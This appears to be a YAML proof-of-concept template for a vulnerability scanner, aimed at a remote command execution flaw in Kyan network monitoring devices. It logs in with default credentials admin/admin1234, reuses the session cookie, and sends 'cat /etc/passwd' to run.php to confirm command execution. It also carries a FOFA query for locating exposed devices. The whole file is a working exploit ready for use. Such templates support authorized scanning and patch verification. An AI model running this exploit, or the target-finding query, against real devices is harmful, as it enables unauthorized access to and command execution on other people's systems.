id: poc-yaml-kyan-network-monitoring-equipment-run-php-rce
info:
  name: Kyan 网络监控设备 run.php 远程命令执行漏洞
  severity: critical
  tags:
  - rce
  finger: Kyan
  fofa: title="platform - Login" && country="CN"
requests:
- method: POST
  path: /login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: user=admin&passwd=admin1234&x=49&y=24
  expression: status_code == 302 && contains(headers,"/index.php")
  output:
  - regex_match(headers,"PHPSESSID=(?P<cookie>[0-9a-z]+)")
- method: POST
  path: /run.php
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID={{.cookie}}
  data: command=cat+%2Fetc%2Fpasswd
  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
    && contains(title,"run")
variables: {}
transport: http
